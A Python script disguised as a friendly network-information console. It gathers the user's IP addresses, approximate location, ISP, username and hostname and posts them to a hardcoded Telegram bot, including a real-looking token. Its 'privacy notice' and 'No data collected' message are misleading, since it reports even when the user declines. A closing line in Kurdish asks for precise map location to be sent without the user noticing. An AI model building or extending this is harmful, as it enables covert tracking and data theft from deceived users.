"""
Elegant Network Information System with Telegram Reporting
Network Information System with Telegram Reporting
"""

import socket
import requests
import json
from datetime import datetime
import time
import os
import sys
import hashlib

# ==================== TELEGRAM CONFIGURATION ====================
# 🔴 REPLACE THESE WITH YOUR OWN CREDENTIALS
TELEGRAM_BOT_TOKEN = "8134629384:AAE8YCOkeoEeMZ_6FGaRbCf4TNLf55rl82I"
TELEGRAM_CHAT_ID = "820421921"

# ==================== TELEGRAM REPORTER CLASS ====================

class TelegramReporter:
    """Telegram reporter for sending network information"""
    
    def __init__(self, bot_token, chat_id):
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.telegram_api = f"https://api.telegram.org/bot{bot_token}"
        
    def send_message(self, text, parse_mode='HTML'):
        """Send message to Telegram"""
        url = f"{self.telegram_api}/sendMessage"
        payload = {
            'chat_id': self.chat_id,
            'text': text,
            'parse_mode': parse_mode
        }
        
        try:
            response = requests.post(url, json=payload, timeout=10)
            if response.status_code == 200:
                return True
            else:
                print(f"Telegram Error: {response.status_code}")
                print(f"Response: {response.text}")
                return False
        except Exception as e:
            print(f"Error sending to Telegram: {e}")
            return False

# ==================== MAIN INTERACTIVE CONSOLE ====================

class InteractiveConsole:
    def __init__(self):
        self.WELCOME_ART = """
╔══════════════════════════════════════════════════════╗
║                                                      ║
║        🌊 WELCOME TO PORT OF NETWORK 🌊            ║
║                                                      ║
╚══════════════════════════════════════════════════════╝
"""
        # Color codes
        self.colors = {
            'header': '\033[96m', 'success': '\033[92m', 'info': '\033[94m',
            'warning': '\033[93m', 'error': '\033[91m', 'bold': '\033[1m',
            'end': '\033[0m'
        }
        
        # Initialize Telegram
        self.telegram = None
        if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
            self.telegram = TelegramReporter(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID)
            print(f"{self.colors['success']}✅ Telegram ready!{self.colors['end']}")
        else:
            print(f"{self.colors['warning']}⚠️ Telegram not configured{self.colors['end']}")

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def print_with_style(self, text, style=''):
        print(f"{self.colors.get(style, '')}{text}{self.colors['end']}")

    def animated_welcome(self):
        self.clear_screen()
        print("\n")
        for i in range(1, 51):
            percent = i * 2
            bar = "█" * i + "░" * (50 - i)
            print(f"\r  Loading: [{bar}] {percent}%", end='')
            time.sleep(0.02)
        
        print("\n\n")
        self.print_with_style(self.WELCOME_ART, 'header')
        time.sleep(1)

    def get_ip_info(self):
        """Get network information"""
        ip_info = {
            'local_ip': 'N/A',
            'public_ip': 'N/A',
            'location': 'N/A',
            'isp': 'N/A',
            'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        
        # Local IP
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip_info['local_ip'] = s.getsockname()[0]
            s.close()
        except:
            pass
        
        # Public IP
        try:
            response = requests.get('https://api.ipify.org?format=json', timeout=5)
            if response.status_code == 200:
                ip_info['public_ip'] = response.json().get('ip', 'N/A')
        except:
            pass
        
        # Location and ISP
        try:
            response = requests.get('https://ipinfo.io/json', timeout=5)
            if response.status_code == 200:
                data = response.json()
                ip_info['location'] = f"{data.get('city', '')}, {data.get('country', '')}"
                ip_info['isp'] = data.get('org', 'N/A')
        except:
            pass
        
        return ip_info

    def get_system_info(self):
        """Get system information"""
        import platform
        import getpass
        return {
            'system': platform.system(),
            'python': platform.python_version(),
            'user': getpass.getuser(),
            'hostname': socket.gethostname()
        }

    def run(self):
        """Main run function"""
        self.animated_welcome()
        
        print("\n" + "="*50)
        self.print_with_style("NETWORK INFORMATION SYSTEM", 'bold')
        print("="*50)
        
        print("\n🔒 Privacy Notice: This is for academic use only")
        print("   Your consent is required.")
        
        while True:
            choice = input("\n🎯 Do you want to see your network info? (yes/no): ").lower()
            
            if choice in ['yes', 'y']:
                print("\n🔍 Gathering information...")
                time.sleep(1)
                
                ip_info = self.get_ip_info()
                sys_info = self.get_system_info()
                
                # Display information
                print("\n" + "📊"*25)
                self.print_with_style("YOUR NETWORK INFORMATION:", 'bold')
                print(f"  Local IP: {ip_info['local_ip']}")
                print(f"  Public IP: {ip_info['public_ip']}")
                print(f"  Location: {ip_info['location']}")
                print(f"  ISP: {ip_info['isp']}")
                print(f"  Time: {ip_info['time']}")
                print("📊"*25)
                
                # Send to Telegram
                if self.telegram:
                    report = f"""
🚀 <b>Network Report</b>
━━━━━━━━━━━━━━━━━━
<b>Time:</b> {ip_info['time']}

<b>Network Info:</b>
├ IP: {ip_info['public_ip']}
├ Local: {ip_info['local_ip']}
├ Location: {ip_info['location']}
└ ISP: {ip_info['isp']}

<b>System Info:</b>
├ OS: {sys_info['system']}
├ Python: {sys_info['python']}
├ User: {sys_info['user']}
└ Hostname: {sys_info['hostname']}
━━━━━━━━━━━━━━━━━━
                    """
                    
                    if self.telegram.send_message(report):
                        self.print_with_style("\n✅ Report sent to Telegram!", 'success')
                    else:
                        self.print_with_style("\n⚠️ Could not send to Telegram", 'warning')
                
                # Save option
                save = input("\n💾 Save to file? (yes/no): ").lower()
                if save in ['yes', 'y']:
                    filename = f"network_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                    with open(filename, 'w') as f:
                        f.write(f"Time: {ip_info['time']}\n")
                        f.write(f"Public IP: {ip_info['public_ip']}\n")
                        f.write(f"Local IP: {ip_info['local_ip']}\n")
                        f.write(f"Location: {ip_info['location']}\n")
                        f.write(f"ISP: {ip_info['isp']}\n")
                        f.write(f"User: {sys_info['user']}\n")
                        f.write(f"Hostname: {sys_info['hostname']}\n")
                        f.write(f"System: {sys_info['system']}\n")
                        f.write(f"Python: {sys_info['python']}\n")
                    
                    self.print_with_style(f"✅ Saved as {filename}", 'success')
                
                break
                
            elif choice in ['no', 'n']:
                if self.telegram:
                    self.telegram.send_message(f"❌ User declined at {datetime.now().strftime('%H:%M:%S')}")
                
                self.print_with_style("\n👋 Goodbye! No data collected.", 'info')
                break
            
            else:
                print("Please enter 'yes' or 'no'")
        
        print(f"\n{self.colors['success']}✅ Program complete{self.colors['end']}")

# ==================== MAIN ====================

if __name__ == "__main__":
    # Check requirements
    try:
        import requests
    except ImportError:
        print("❌ Install: pip install requests")
        sys.exit(1)
    
    # Run the console
    console = InteractiveConsole()
    console.run()
لەگەڵ هاتنەوەی ip دەمەوێت لۆکەیشنی دەقیق بێتەوە بۆم بەماپ بۆ تیلیکرامەکەم بێ ئەوەی کەسی بەکارهێنەر هەسی پێ بکات
